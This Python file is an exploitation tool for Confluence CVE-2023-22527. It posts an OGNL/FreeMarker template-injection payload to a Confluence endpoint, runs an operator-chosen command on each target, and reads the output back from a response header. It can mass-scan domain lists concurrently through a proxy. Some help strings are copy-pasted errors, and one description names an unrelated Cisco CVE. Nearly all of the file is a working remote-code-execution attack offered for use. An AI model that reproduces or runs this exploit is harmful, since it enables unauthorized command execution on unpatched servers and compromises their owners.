import requests 
from colorama import Fore ,  Style , Back
import concurrent.futures
import random
import time as t
import argparse
import string
import os 
import urllib3
import time
from bs4 import BeautifulSoup
import warnings
from alive_progress import alive_bar
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

green = Fore.GREEN

magenta = Fore.MAGENTA

cyan = Fore.CYAN

mixed = Fore.RED + Fore.BLUE

red = Fore.RED

blue = Fore.BLUE

yellow = Fore.YELLOW

white = Fore.WHITE

reset = Style.RESET_ALL

bold = Style.BRIGHT


colors = [ green, cyan, blue]

random_color = random.choice(colors)

targets = []


def banner():
    
    banner = f"""{bold}{random_color}

    ______     ____  __         _ ______         
   / ____/  __/ __ \/ /  ____  (_)_  __/__  _____
  / __/ | |/_/ /_/ / /  / __ \/ / / / / _ \/ ___/
 / /____>  </ ____/ /__/ /_/ / / / / /  __/ /    
/_____/_/|_/_/   /_____|____/_/ /_/  \___/_/     
                                                   
                                            
                      Author   : D.SanjaiKumar @CyberRevoltSecurities  
                                              
                      Github   : https://github.com/sanjai-AK47
                      
                      LinkedIN : https://www.linkedin.com/in/d-sanjai-kumar-109a7227b/    
                                               

    {reset}"""
    word ="                     Exploiter an Exploitation Tool for Confluence CVE-2023-22527\n"


    print(banner)
    for char in word:
        print(f"{bold}{random_color}{char}{reset}", end='', flush=True)
        time.sleep(0.001)
        


parser =  argparse.ArgumentParser(description=f"[{bold}{blue}DESCTIPTION{reset}]: {bold}{white}Exploitation and Detection tool for Cisco CVE-2023-46747")

parser.add_argument("-d", "--domain", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Target domain for exploiting without protocol eg:(www.domain.com)", type=str)

parser.add_argument("-dL", "--domains-list", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Targets domain for exploiting without protocol eg:(www.domain.com)", type=str)

parser.add_argument("-cmd", "--command", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Give your burp collabarator url for exploitation", type=str)

parser.add_argument("-c", "--concurrency", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Give your burp collabarator url for exploitation", type=int)

parser.add_argument("-o", '--output', help=f"[{bold}{blue}INFO{reset}]: {bold}{white}File name to save output", type=str)

parser.add_argument("-to", "--time-out", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching timeout will requests till for your timeout and also for BURPSUITE", type=int)

parser.add_argument("-px", "--proxy", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching proxy will send request to your configured proxy (eg: BURPSUITE)", type=str)

parser.add_argument("-v", "--verbose", help=f"[{bold}{blue}INFO{reset}]: {bold}{white}Switiching Verbose will shows offline targets", action="store_true")

args = parser.parse_args()



def exploits(url):
    
    try:
        
        
        
        proxies = {
            
            "http": f"{args.proxy}",
            "https": f"{args.proxy}"
        } if args.proxy else None
        
        timeout = args.time_out if args.time_out else 10
        
        headers = {
    "Accept-Encoding": "gzip, deflate, br",
    "Accept": "*/*",
    "Accept-Language": "en-US;q=0.9,en;q=0.8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36",
    "Connection": "close",
    "Cache-Control": "max-age=0",
    "Content-Type": "application/x-www-form-urlencoded",
    
    
    
}
        
        
        
        data = r"label=\u0027%2b#request\u005b\u0027.KEY_velocity.struts2.context\u0027\u005d.internalGet(\u0027ognl\u0027).findValue(#parameters.x,{})%2b\u0027&x=@org.apache.struts2.ServletActionContext@getResponse().setHeader('X-Cmd-Response',(new freemarker.template.utility.Execute()).exec({'" + args.command + "'}))"
        
        base_url = f"{url}/template/aui/text-inline.vm"
        
        response =  requests.post(base_url, headers=headers, proxies=proxies, timeout=timeout, data=data, allow_redirects=True)
        
        if (response.headers.get("X-Cmd-Response")):
            
                command = response.headers.get("X-Cmd-Response")
            
        else:
                command = "Execution none"
       
        
        if "Empty{name=" in response.text:
            
            
            
            
             print(f"[{bold}{green}VULN{reset}]: {bold}{white}Exploitation success \nURL: {base_url} \nExecuted command: {bold}{blue}{command}{reset}")
            
            
        else:
            
            if args.verbose:
                
                print(f"[{bold}{red}NOT-VULN{reset}]: {bold}{white}{url} and Command: {command}{reset}")
                
        
                
        
    except requests.exceptions.RequestException as e:
        
        if args.verbose:
            
            print(f"[{bold}{red}NOT-VULN{reset}]: {bold}{white}{url}{reset}")
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    

def threader() :
    
    try:

        
            with alive_bar(len(targets), enrich_print=False) as bar:
                    
                    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency)  as executor:
                        
                       
                        futures = [executor.submit(exploits, url) for url in targets]

                        for futures in concurrent.futures.as_completed(futures):
                                
                            bar()
                            
    except KeyboardInterrupt as e:
        
        
        quit()
        
    except Exception as e:
        
        pass
        

def main():
    
    try:
        
        banner()
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
    
    try:
        
        if args.domain and not args.domains_list:
        
            url =  args.domain 
            
            if url.startswith("https://") or url.startswith("http://"):
        
                targets.append(url)
            
            else:
                
                print(f"[{bold}{red}INFO{reset}]: {bold}{white}Please provide with http:// or https:// protocol{reset}")
                
                quit()
            
            exploits(url)
            
        if args.domains_list and not args.domain:
            
        
            try:
                
            
                filename= args.domains_list
            
                with open(filename, "r") as url:
                
                    urls = url.read().split()
                
                for url in urls:
                
                      
                      if url.startswith("https://") or url.startswith("http://"):
                                      
                          
                        targets.append(url)
                        
                        
                      else:
                         
                          new_url = f"https://{url}"
                          
                          new_http = f"http://{url}"
                          
                          targets.append(new_url)
                          
                          targets.append(new_http)
                
                threader()

            
            except FileNotFoundError as e:
            
                print(f"[{bold}{red}ALERT{reset}]: {bold}{white}File not Found please check the file exits or not{reset}")
            
                exit()
            
            except KeyboardInterrupt as e:
        
                print(f"{bold}{bold} CTRL+C Pressed{reset}")
        
                exit()
        
            except Exception as e:
        
                pass
                
            
        if not args.domain and not args.domains_list:
        
        
            print(f"[{bold}{red}FLAG-ERROR{reset}]: {bold}{white}Please provide a domain or domains list for exploit{reset}")
            
        
        
    except KeyboardInterrupt as e:
        
        print(f"{bold}{bold} \nCTRL+C Pressed{reset}")
        
        exit()
        
    except Exception as e:
        
        pass
        
        
if __name__ == "__main__":
    
    main()

        
            
    

